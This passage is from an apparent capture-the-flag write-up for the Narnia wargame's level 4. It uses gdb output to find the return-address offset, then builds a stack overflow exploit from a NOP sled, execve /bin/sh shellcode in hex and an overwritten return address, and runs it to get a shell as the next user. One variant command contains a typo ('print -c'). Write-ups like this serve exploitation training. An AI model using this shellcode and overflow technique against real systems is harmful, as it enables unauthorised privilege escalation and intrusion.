0xffffd5c0: 0x41414141 0x41414141 0x41414141 0x00000000
0xffffd5d0: 0x08048500 0x00000000 0x00000000 0xf7e404b3
0xffffd5e0: 0x00000002 0xffffd674 0xffffd680 0xf7fcf000
0xffffd5f0: 0x00000000 0xffffd61c 0xffffd680 0x00000000
0xffffd600: 0x0804824c 0xf7fcaff4
```

Taking a look at the information of the frame gives us the return address, from which we find the size of the Stack:

```sh
(gdb) i f
Stack level 0, frame at 0xffffd5e0:
 eip = 0x80484fa in main; saved eip 0xf7e404b3
 Arglist at 0xffffd5d8, args:
 Locals at 0xffffd5d8, Previous frame's sp is 0xffffd5e0
 Saved registers:
 ebp at 0xffffd5d8, edi at 0xffffd5d4, eip at 0xffffd5dc
(gdb) p 0xffffd5dc-0xffffd4cc
$1 = 272
```



### Step 4: Writing and Applying the Exploit

We know that the Stack has a size of 272 bytes and that the return address is **0xffffd5dc**. If we add the return address, it sums to 276.

Now we have some freedom to choose where to place our shellcode. Let's say, we place it somewhere in the middle, say, at the position 134. In the memory, we get: ```0xffffd5cc - 134 = 0xffffd546```.

Since 276 minus 134 is 142, if we point the return address to **0xffffd546**, it will go to the 142th position in the Stack and execute whatever is there. We want to make sure that the return address will always end in the shellcode address and for this reason, we fill the addresses around with NOPs.


We will borrow the shellcode from the previous levels, which has size of 25 bytes:

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80
```

Considering the values above, we can write the following exploit:

```
`python -c "print '\x90'*142 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80' + 'A'*105 + '\x46\xd5\xff\xff'"`
```

We could have used another address to craft another version of the exploit. Then we would have to simply adjust our NOPs and our paddings. For example, ```0xffffd5cc - 120 = 0xffffd554```:

```
`print -c "'\x90'*156 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80' + 'A'*91 + '\x54\xd5\xff\xff'" `
```

They both work.

We finally apply our exploit:
```
narnia4@melinda:/tmp$ python -c "print '\x90'*156 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80' + 'A'*91 + '\x54\xd5\xff\xff'"
������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��P��P���
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT���
narnia4@melinda:/tmp$ /narnia/narnia4 `python -c "print '\x90'*156 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80' + 'A'*91 + '\x54\xd5\xff\xff'"`
$ whoami
narnia5
```
